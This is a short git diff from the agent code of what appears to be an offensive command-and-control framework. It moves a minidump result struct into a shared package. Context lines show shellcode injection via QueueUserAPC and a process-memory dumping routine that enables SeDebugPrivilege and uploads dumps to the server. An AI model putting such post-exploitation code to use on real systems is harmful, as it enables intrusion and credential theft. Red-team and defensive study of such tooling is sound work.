@@ -20,6 +20,7 @@
 package agent
 
 import (
+	"github.com/Ne0nd0g/merlin/pkg/modules"
 	// Standard
 	"errors"
 	"fmt"
@@ -377,16 +378,9 @@ func ExecuteShellcodeQueueUserAPC(shellcode []byte, pid uint32) error {
 
 // TODO always close handle during exception handling
 
-//MinidumpFile holds the structure of of a Minidump operation to report back to merlin
-type MinidumpFile struct {
-	ProcName    string
-	ProcID      uint32
-	FileContent []byte
-}
-
 // miniDump will attempt to perform a minidumpwritedump operation on the provided process, and returns the raw bytes of the dumpfile back as an upload to the server. Touches disk during the dump process, however uses the OS default tempfile location
-func miniDump(tempfile, process string, inPid uint32) (MinidumpFile, error) {
-	ret := MinidumpFile{} // []byte{}
+func miniDump(tempfile, process string, inPid uint32) (modules.MinidumpFile, error) {
+	ret := modules.MinidumpFile{} // []byte{}
 	pid := inPid
 	//get debug privs (required for dumping processes not owned by current user)
 	err := sePrivEnable("SeDebugPrivilege")
